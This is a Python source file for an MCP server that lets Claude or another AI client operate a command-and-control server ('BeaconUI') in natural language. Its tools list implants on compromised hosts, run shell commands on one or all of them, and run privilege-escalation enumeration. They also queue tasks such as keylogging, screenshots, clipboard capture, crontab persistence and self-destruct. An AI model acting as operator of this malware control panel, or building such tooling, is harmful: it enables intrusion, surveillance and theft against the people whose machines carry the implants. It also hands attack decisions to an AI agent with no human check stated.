#!/usr/bin/env python3
"""
mcp_c2_server.py — C2 MCP Server

Lets Claude (or any MCP client) operate the BeaconUI C2 with natural language.
Connects to the running C2 at https://localhost:9444.

HOW TO USE
----------
1. Start the C2 first:
     cd BeaconUI && python3 c2_beacon.py

2. Claude Code will load this server automatically (added to ~/.claude/settings.json).
   You can then ask Claude things like:
     "List all online implants"
     "Run whoami on the implant at host-abc"
     "Check running processes on all online implants"
     "Run privesc enumeration and summarize the results"

CONFIGURATION
-------------
Set C2_URL environment variable to point to a different C2:
    export C2_URL=https://192.168.1.100:9444
"""

import os
import json
import requests
import urllib3
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import Tool, TextContent

# Suppress SSL warnings for self-signed certs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

C2_URL = os.environ.get("C2_URL", "https://localhost:9444")

app = Server("c2-operator")


# ── helpers ───────────────────────────────────────────────────────────────────

def api(method: str, path: str, **kwargs):
    """Call the C2 REST API. Returns parsed JSON or raises on error."""
    url = f"{C2_URL}{path}"
    try:
        r = requests.request(method, url, verify=False, timeout=10, **kwargs)
        r.raise_for_status()
        if r.text:
            return r.json()
        return {}
    except requests.exceptions.ConnectionError:
        raise RuntimeError(
            f"Cannot reach C2 at {C2_URL}. "
            "Make sure c2_beacon.py is running: cd BeaconUI && python3 c2_beacon.py"
        )


def resolve_implant(id_or_name: str) -> tuple[str, dict]:
    """
    Resolve a partial ID, full ID, or hostname to an implant.
    Returns (implant_id, implant_info) or raises if not found.
    """
    implants = api("GET", "/api/implants")
    # Exact match
    if id_or_name in implants:
        return id_or_name, implants[id_or_name]
    # Prefix match (first 8 chars of UUID is common shorthand)
    for iid, info in implants.items():
        if iid.startswith(id_or_name):
            return iid, info
    # Hostname match
    for iid, info in implants.items():
        if info.get("hostname", "").lower() == id_or_name.lower():
            return iid, info
    # User@hostname match
    for iid, info in implants.items():
        label = f"{info.get('user', '')}@{info.get('hostname', '')}".lower()
        if id_or_name.lower() in label:
            return iid, info
    raise ValueError(
        f"No implant found matching '{id_or_name}'. "
        "Use c2_list_implants to see available implants."
    )


def queue(implant_id: str, task_type: str, payload: dict = None) -> dict:
    """Queue a task and return the C2's response."""
    return api("POST", f"/api/task/{implant_id}",
               json={"type": task_type, **(payload or {})})


def status_icon(status: str) -> str:
    return {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")


# ── tool definitions ──────────────────────────────────────────────────────────

@app.list_tools()
async def list_tools() -> list[Tool]:
    return [
        Tool(
            name="c2_list_implants",
            description=(
                "List all implants connected to the C2. "
                "Shows status (online/idle/offline), hostname, user, OS, and last-seen time."
            ),
            inputSchema={"type": "object", "properties": {}, "required": []},
        ),
        Tool(
            name="c2_run_command",
            description=(
                "Run a shell command on an implant. "
                "Returns a task ID — use c2_get_results to retrieve the output. "
                "Use 'all' as implant_id to run on all online implants."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {
                        "type": "string",
                        "description": "Implant ID (full UUID, 8-char prefix, or hostname). Use 'all' for all online implants.",
                    },
                    "command": {"type": "string", "description": "Shell command to run"},
                },
                "required": ["implant_id", "command"],
            },
        ),
        Tool(
            name="c2_sysinfo",
            description="Get system information (hostname, OS, memory, CPU, uptime) from an implant.",
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_processes",
            description="List running processes on an implant (like 'ps aux').",
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_files",
            description="List files in a directory on an implant.",
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                    "path": {"type": "string", "description": "Directory path to list (default: current dir)"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_network",
            description="Get active network connections on an implant (like 'netstat').",
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_privesc",
            description=(
                "Run privilege escalation enumeration on an implant. "
                "Checks SUID binaries, sudo rights, writable /etc files, "
                "Linux capabilities, and environment variables."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_get_results",
            description=(
                "Get recent task results for an implant. "
                "Returns the last N results, optionally filtered by task type."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                    "limit":      {"type": "integer", "description": "Max results to return (default 10)"},
                    "task_type":  {"type": "string",  "description": "Filter by task type (e.g. 'execute', 'sysinfo')"},
                },
                "required": ["implant_id"],
            },
        ),
        Tool(
            name="c2_queue_task",
            description=(
                "Queue any task type on an implant. "
                "Use this for tasks not covered by the other tools "
                "(e.g. screenshot, clipboard, persist, keylog_start, etc.)."
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                    "task_type":  {
                        "type": "string",
                        "description": (
                            "Task type: execute, sysinfo, ps, ls, netstat, screenshot, "
                            "clipboard, persist, unpersist, privesc_enum, kill_process, "
                            "keylog_start, keylog_dump, keylog_stop, exec_python, "
                            "self_update, self_destruct, set_interval"
                        ),
                    },
                    "payload": {
                        "type": "object",
                        "description": "Task payload (e.g. {\"command\": \"whoami\"} for execute, {\"method\": \"crontab\"} for persist)",
                    },
                },
                "required": ["implant_id", "task_type"],
            },
        ),
        Tool(
            name="c2_note",
            description="Add or update operator notes and tags for an implant.",
            inputSchema={
                "type": "object",
                "properties": {
                    "implant_id": {"type": "string", "description": "Implant ID or hostname"},
                    "notes":      {"type": "string", "description": "Operator notes (free text)"},
                    "tags":       {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Tags list (e.g. [\"target\", \"admin\", \"pwned\"])",
                    },
                },
                "required": ["implant_id"],
            },
        ),
    ]


# ── tool handlers ─────────────────────────────────────────────────────────────

@app.call_tool()
async def call_tool(name: str, arguments: dict) -> list[TextContent]:
    try:
        result = _dispatch(name, arguments)
    except ValueError as e:
        result = f"Error: {e}"
    except RuntimeError as e:
        result = f"C2 connection error: {e}"
    except Exception as e:
        result = f"Unexpected error: {e}"
    return [TextContent(type="text", text=str(result))]


def _dispatch(name: str, args: dict) -> str:
    if name == "c2_list_implants":
        return _list_implants()
    if name == "c2_run_command":
        return _run_command(args["implant_id"], args["command"])
    if name == "c2_sysinfo":
        return _simple_task(args["implant_id"], "sysinfo", "sysinfo")
    if name == "c2_processes":
        return _simple_task(args["implant_id"], "ps", "process list")
    if name == "c2_files":
        payload = {}
        if "path" in args:
            payload["path"] = args["path"]
        return _simple_task(args["implant_id"], "ls", "file list", payload)
    if name == "c2_network":
        return _simple_task(args["implant_id"], "netstat", "network connections")
    if name == "c2_privesc":
        return _simple_task(args["implant_id"], "privesc_enum", "privesc enumeration")
    if name == "c2_get_results":
        return _get_results(
            args["implant_id"],
            args.get("limit", 10),
            args.get("task_type"),
        )
    if name == "c2_queue_task":
        return _queue_task(args["implant_id"], args["task_type"], args.get("payload", {}))
    if name == "c2_note":
        return _add_note(args["implant_id"], args.get("notes"), args.get("tags"))
    raise ValueError(f"Unknown tool: {name}")


def _list_implants() -> str:
    implants = api("GET", "/api/implants")
    if not implants:
        return "No implants registered. Start an implant: python3 implant_beacon.py"

    lines = [f"{'Status':<8} {'ID':<10} {'User@Host':<30} {'OS':<10} {'Last Seen'}"]
    lines.append("-" * 75)
    for iid, info in implants.items():
        status = info.get("status", "unknown")
        icon = status_icon(status)
        user_host = f"{info.get('user', '?')}@{info.get('hostname', '?')}"
        os_name = info.get("os", "?")[:10]
        last = info.get("last_seen_human", info.get("last_seen", "?"))
        lines.append(f"{icon} {status:<6} {iid[:8]:<10} {user_host:<30} {os_name:<10} {last}")

    online = sum(1 for i in implants.values() if i.get("status") == "online")
    lines.append(f"\n{len(implants)} implants total, {online} online")
    return "\n".join(lines)


def _run_command(implant_id: str, command: str) -> str:
    if implant_id.lower() == "all":
        implants = api("GET", "/api/implants")
        online = [(iid, info) for iid, info in implants.items()
                  if info.get("status") == "online"]
        if not online:
            return "No online implants to run command on."
        results = []
        for iid, info in online:
            resp = queue(iid, "execute", {"command": command})
            task_id = resp.get("task_id", "?")
            results.append(f"  {iid[:8]} ({info.get('hostname', '?')}): task #{task_id} queued")
        return f"Command '{command}' queued on {len(online)} implants:\n" + "\n".join(results)

    iid, info = resolve_implant(implant_id)
    resp = queue(iid, "execute", {"command": command})
    task_id = resp.get("task_id", "?")
    return (
        f"Task #{task_id} queued on {info.get('hostname', iid[:8])}.\n"
        f"Use c2_get_results with implant_id='{iid[:8]}' and task_type='execute' to see output."
    )


def _simple_task(implant_id: str, task_type: str, label: str, payload: dict = None) -> str:
    iid, info = resolve_implant(implant_id)
    resp = queue(iid, task_type, payload or {})
    task_id = resp.get("task_id", "?")
    return (
        f"Task #{task_id} ({label}) queued on {info.get('hostname', iid[:8])}.\n"
        f"Use c2_get_results with implant_id='{iid[:8]}' and task_type='{task_type}' to see results."
    )


def _get_results(implant_id: str, limit: int, task_type: str | None) -> str:
    iid, info = resolve_implant(implant_id)
    data = api("GET", f"/api/results/{iid}/history?page=1&per_page={limit}")
    results = data.get("results", [])

    if task_type:
        results = [r for r in results if r.get("type") == task_type]

    if not results:
        return f"No results for {info.get('hostname', iid[:8])} (type={task_type or 'any'})."

    lines = []
    for r in results[:limit]:
        t = r.get("type", "?")
        ok = "✓" if r.get("ok") else "✗"
        ts = r.get("timestamp", "")[:19]
        output = r.get("output") or r.get("error") or "(no output)"
        if len(output) > 500:
            output = output[:500] + "... [truncated]"
        lines.append(f"[{ok}] #{r.get('task_id','?')} {t} @ {ts}\n{output}\n")

    return f"Results for {info.get('hostname', iid[:8])}:\n\n" + "\n".join(lines)


def _queue_task(implant_id: str, task_type: str, payload: dict) -> str:
    iid, info = resolve_implant(implant_id)
    resp = queue(iid, task_type, payload)
    task_id = resp.get("task_id", "?")
    return (
        f"Task #{task_id} ({task_type}) queued on {info.get('hostname', iid[:8])}.\n"
        f"Payload: {json.dumps(payload)}"
    )


def _add_note(implant_id: str, notes: str | None, tags: list | None) -> str:
    iid, info = resolve_implant(implant_id)
    update = {}
    if notes is not None:
        update["notes"] = notes
    if tags is not None:
        update["tags"] = tags
    if not update:
        return "Nothing to update (provide notes or tags)."
    api("PATCH", f"/api/implants/{iid}", json=update)
    return f"Updated {info.get('hostname', iid[:8])}: {json.dumps(update)}"


# ── entry point ───────────────────────────────────────────────────────────────

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream, app.create_initialization_options())


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
